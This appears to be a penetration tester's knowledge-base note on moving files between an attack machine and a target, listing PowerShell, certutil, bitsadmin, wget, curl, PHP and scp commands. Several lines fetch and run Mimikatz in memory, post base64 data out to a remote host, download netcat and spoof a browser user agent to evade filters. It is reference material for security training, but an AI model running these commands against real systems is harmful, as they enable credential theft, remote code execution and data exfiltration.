---
tags:
  - knowledge-base
category: misc
---

# File Transfers

#PowerShell

Good way to transfer files from attack box to target Windows system is through PowerShell since it is on every Windows machine. Best way to do this can be through the BITS system.
After setting up a server on the attack machine, unless pulling a file from the Internet, you can run the below command to download that file onto the target.

```PowerShell
Start-BitsTransfer -Source <source> -Destination C:\%TEMP%
```

Other PowerShell transfer options:

```PowerShell
Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
```
*Download a file with PowerShell*

```PowerShell
IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
```
*Execute a file in memory using PowerShell (no file ever touches disk)*

```PowerShell
Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
```
*Upload a file with PowerShell*

```PowerShell
Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
```
*`Invoke-WebRequest` using a Chrome User-Agent, useful if a proxy/filter blocks the default PowerShell UA*

#cmd

Transfer a file from a web server using the built-in exe certutil.exe:

```cmd
certutil.exe -urlcache -split -f "http://{ip}:{port}/backup.exe" backup.exe
```


#Bitsadmin

```cmd
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
```
*Download a file using Bitsadmin (older Windows alternative to `Start-BitsTransfer`)*

#Linux

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
*Download a file using Wget*

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
*Download a file using cURL*

```php
php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```
*Download a file using PHP*

#SCP

```bash
scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip
```
*Upload a file using SCP*

```bash
scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
```
*Download a file using SCP*
